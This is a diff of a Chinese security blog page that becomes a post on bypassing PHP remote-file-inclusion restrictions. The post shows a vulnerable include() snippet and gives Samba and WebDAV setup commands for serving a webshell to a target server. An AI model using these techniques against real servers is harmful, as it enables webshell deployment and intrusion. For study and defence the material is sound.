@@ -6,15 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: 一些姿势 | 七友のBlog</title>
+  <title>bypass-RFI的一些思路 | 七友のBlog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="七友のBlog">
-<meta property="og:url" content="http://yoursite.com/tags/一些姿势/index.html">
+  <meta name="description" content="前言下面介绍的两个姿势都是先知群里面get到的，这里记录一下，给先知的师傅们倒茶。 绕过思路假设我们有一个这样的代码123&amp;lt;?phpinclude($_GET[&quot;shell&quot;]);?&amp;gt; 我们发现通过phpinfo发现allow_url_fopen=Off和allow_url_include=Off  用常规的方法直接包含一个远程文件肯定是不行的  所以我们得想办法绕过allow_url">
+<meta name="keywords" content="一些姿势,文件包含">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bypass-RFI的一些思路">
+<meta property="og:url" content="http://yoursite.com/2019/05/15/bypass-RFI限制的一些思路/index.html">
 <meta property="og:site_name" content="七友のBlog">
+<meta property="og:description" content="前言下面介绍的两个姿势都是先知群里面get到的，这里记录一下，给先知的师傅们倒茶。 绕过思路假设我们有一个这样的代码123&amp;lt;?phpinclude($_GET[&quot;shell&quot;]);?&amp;gt; 我们发现通过phpinfo发现allow_url_fopen=Off和allow_url_include=Off  用常规的方法直接包含一个远程文件肯定是不行的  所以我们得想办法绕过allow_url">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190514222028-6c58eb54-7653-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190514223651-b6220bf6-7655-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190514222432-fe128316-7653-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190514224804-47be592e-7657-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190514222633-460cdae0-7654-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190515001220-0d01bde2-7663-1.png">
+<meta property="og:updated_time" content="2019-05-15T02:28:33.984Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="七友のBlog">
+<meta name="twitter:title" content="bypass-RFI的一些思路">
+<meta name="twitter:description" content="前言下面介绍的两个姿势都是先知群里面get到的，这里记录一下，给先知的师傅们倒茶。 绕过思路假设我们有一个这样的代码123&amp;lt;?phpinclude($_GET[&quot;shell&quot;]);?&amp;gt; 我们发现通过phpinfo发现allow_url_fopen=Off和allow_url_include=Off  用常规的方法直接包含一个远程文件肯定是不行的  所以我们得想办法绕过allow_url">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190514222028-6c58eb54-7653-1.png">
   
     <link rel="alternative" href="/atom.xml" title="七友のBlog" type="application/atom+xml">
   
@@ -136,36 +148,89 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-bypass-RFI限制的一些思路" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/05/15/bypass-RFI限制的一些思路/" class="archive-article-date">
-  	<time datetime="2019-05-14T16:27:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-15</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/05/15/bypass-RFI限制的一些思路/">bypass-RFI的一些思路</a>
+    <h1 class="article-title" itemprop="name">
+      bypass-RFI的一些思路
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2019/05/15/bypass-RFI限制的一些思路/" class="archive-article-date">
+  	<time datetime="2019-05-14T16:27:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>下面介绍的两个姿势都是先知群里面get到的，这里记录一下，给先知的师傅们倒茶。</p>
+<h1 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h1><p>假设我们有一个这样的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">"shell"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>我们发现通过<code>phpinfo</code>发现<code>allow_url_fopen=Off</code>和<code>allow_url_include=Off</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222028-6c58eb54-7653-1.png" alt="image.png"></p>
+<p>用常规的方法直接包含一个远程文件肯定是不行的</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514223651-b6220bf6-7655-1.png" alt="image.png"></p>
+<p>所以我们得想办法绕过<code>allow_url_fopen=Off</code>和<code>allow_url_include=Off</code>的限制</p>
+<h2 id="第一种姿势：利用SMB文件共享服务"><a href="#第一种姿势：利用SMB文件共享服务" class="headerlink" title="第一种姿势：利用SMB文件共享服务"></a>第一种姿势：利用<code>SMB</code>文件共享服务</h2><p>对于PHP而言即使<code>allow_url_include</code>和<code>allow_url_fopen</code>都设置为<code>Off</code>，PHP也会加载SMB URL。所以我们可以配合<code>SMB</code>远程加载我们的<code>webshell</code>，我们同时要设置<code>SMB</code>共享服务器允许外部访问我们的<code>webshell</code>文件，所以我们需要配置一个具有匿名浏览访问权限的SMB服务器，一旦受害者尝试访问我们的<code>SMB</code>服务器上的<code>webshell</code>，我们的<code>SMB</code>服务器将不会请求任何凭证，受害者就会包含我们的<code>SMB</code>服务器上的webshell文件</p>
+<h3 id="SAMBA服务器配置"><a href="#SAMBA服务器配置" class="headerlink" title="SAMBA服务器配置"></a>SAMBA服务器配置</h3><blockquote>
+<p>Samba是在Linux和UNIX系统上实现SMB协议的一个软件</p>
+</blockquote>
+<p>安装SAMBA<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install samba</span><br></pre></td></tr></table></figure></p>
+<p>创建SMB共享目录<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/www/html/share/</span><br></pre></td></tr></table></figure></p>
+<p>配置新创建的SMB共享目录的权限<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 0555 /var/www/html/share/</span><br><span class="line">chown -R nobody:nogroup /var/www/html/share/</span><br></pre></td></tr></table></figure></p>
+<p>清空<code>/etc/samba/smb.conf</code>文件中的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; /etc/samba/smb.conf</span><br></pre></td></tr></table></figure></p>
+<p>将下面内容粘贴到<code>/etc/samba/smb.conf</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">workgroup = WORKGROUP</span><br><span class="line">server string = Samba Server %v</span><br><span class="line">netbios name = indishell-lab</span><br><span class="line">security = user</span><br><span class="line">map to guest = bad user</span><br><span class="line">name resolve order = bcast host</span><br><span class="line">dns proxy = no</span><br><span class="line">bind interfaces only = yes</span><br><span class="line"></span><br><span class="line">[ica]</span><br><span class="line">path = /var/www/html/share</span><br><span class="line">writable = no</span><br><span class="line">guest ok = yes</span><br><span class="line">guest only = yes</span><br><span class="line">read only = yes</span><br><span class="line">directory mode = 0555</span><br><span class="line">force user = nobody</span><br></pre></td></tr></table></figure></p>
+<p>重启<code>smb</code>服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service smbd restart</span><br></pre></td></tr></table></figure></p>
+<p>然后访问一下，发现可以正常访问</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222432-fe128316-7653-1.png" alt="image.png"></p>
+<p><code>\\192.168.163.128\ica\shell.php</code>内容为：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514224804-47be592e-7657-1.png" alt="image.png"></p>
+<p>尝试包含一波，成功包含</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190514222633-460cdae0-7654-1.png" alt="image.png"></p>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这种方法还是比较局限的，因为这种<code>unc</code>只能是在windows下使用，而且国内的运营商对<code>smb</code>还是比较敏感的，毕竟被勒索病毒搞怕了/捂脸。。。。。</p>
+<h2 id="第二种姿势：利用webdav"><a href="#第二种姿势：利用webdav" class="headerlink" title="第二种姿势：利用webdav"></a>第二种姿势：利用webdav</h2><p><strong> PS：这个思路是Lz1y师傅在ph师傅小密圈提到的，tql </strong></p>
+<p>如果对<code>webdav</code>不是很了解的话，可以自行百度google，我这里就不多赘述了（其实我也不会）</p>
+<p>用docker启动一个webdav服务器（ph师傅给的）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -v ~/webdav:/var/lib/dav -e ANONYMOUS_METHODS=GET,OPTIONS,PROPFIND -e LOCATION=/webdav -p 80:80 --rm --name webdav bytemark/webdav</span><br></pre></td></tr></table></figure></p>
+<p>然后把php文件放到<code>~/webdav/data</code>里面</p>
+<p>尝试包含，包含成功<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190515001220-0d01bde2-7663-1.png" alt="image.png"><br>注意包含的路径是<code>//ip//webdav/shell.php</code>而不是<code>//ip/webdav/shell.php</code>，至于为什么呢我也不是很清楚，如果是用浏览器直接打开的话两种方式都可以，但是不知道为啥放在<code>php</code>上后者的那种方式就不行了，有知道的师傅还请不吝赐教。</p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener">http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a></p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/png/2.png">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -181,143 +246,106 @@
 		</ul>
 	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/04/04/Bypass-disabled-functions一些思路总结/" class="archive-article-date">
-  	<time datetime="2019-04-04T02:17:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-04-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/04/04/Bypass-disabled-functions一些思路总结/">Bypass-disabled_functions一些思路总结</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">一些姿势</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/02/01/Bypass一些命令注入限制的姿势/" class="archive-article-date">
-  	<time datetime="2019-02-01T02:12:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/02/01/Bypass一些命令注入限制的姿势/">Bypass一些命令注入限制的姿势</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">一些姿势</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
       
-        </div></section>
+
       
+
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/12/24/Phar的一些利用姿势/" class="archive-article-date">
-  	<time datetime="2018-12-24T02:11:18.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-12-24</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/12/24/Phar的一些利用姿势/">Phar的一些利用姿势</a>
-    </h1>
-  
+      </div>
+    </span>
+  </div>
+</div>
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">一些姿势</a>
-        		</li>
-      		
-		</ul>
-	</div>
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/05/15/bypass-RFI限制的一些思路/" alt="微信分享二维码">
+    </div>
+</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
   
   
-    </div></section>
+    <a href="/2019/04/09/运用Scapy编写类似于Nmap的端口扫描脚本/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">运用Scapy编写类似于Nmap的端口扫描脚本</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+  
+  
   
 
-    
+  
+
+  
+
+  
 
 
           </div>
@@ -340,9 +368,9 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
